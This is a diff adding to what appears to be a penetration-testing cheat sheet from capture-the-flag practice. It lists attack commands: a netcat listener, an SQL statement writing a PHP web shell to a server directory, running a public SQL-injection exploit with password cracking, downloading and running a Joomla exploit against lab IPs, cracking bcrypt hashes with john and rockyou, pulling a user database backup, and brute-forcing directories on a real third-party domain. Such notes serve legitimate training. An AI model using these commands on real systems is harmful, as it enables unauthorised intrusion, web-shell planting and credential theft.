@@ -57,6 +57,33 @@ nc -nlvp 9999
 SELECT "<html><body><?php echo system($_GET['command']); ?></body></html>" into outfile "/usr/share/tomcat9-root/"
 ```
 
+### Exploit SQLi along with cracking pass
+
+python 46635.py -u http://10.10.146.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+
+## Directly Download exploit and run it
+
+wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
+
+python2.7 joomblah.py http://10.10.91.172
+
+## Identify Hashes
+
+hashes.com
+
+nano hash
+
+cat hash
+
+#### Breaking Hash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+## Open .bak Files (SQLite)
+
+wget http://10.10.74.246/custom/js/users.bak
+
+sqlitebrowser users.bak
+
 ## Directory Bruteforce Tools
 
 gobuster dir -u https://google.in/abc/documents -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt (dir enum)
